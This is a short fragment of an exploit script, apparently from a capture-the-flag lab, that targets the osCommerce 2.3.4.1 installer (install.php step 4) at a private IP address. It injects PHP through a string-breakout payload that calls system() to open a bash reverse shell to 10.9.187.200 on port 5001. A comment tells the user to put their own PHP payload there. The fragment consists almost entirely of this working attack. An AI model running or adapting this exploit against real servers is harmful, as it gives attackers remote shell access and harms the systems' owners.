...
target_url =  "http://10.10.208.71/oscommerce-2.3.4.1/log/install/install.php?step=4"
...
payload = '\');'
payload += 'system( " bash -i >& /dev/tcp/10.9.187.200/5001  0>&1 ");'    # this is where you enter you PHP payload
payload += '/*'
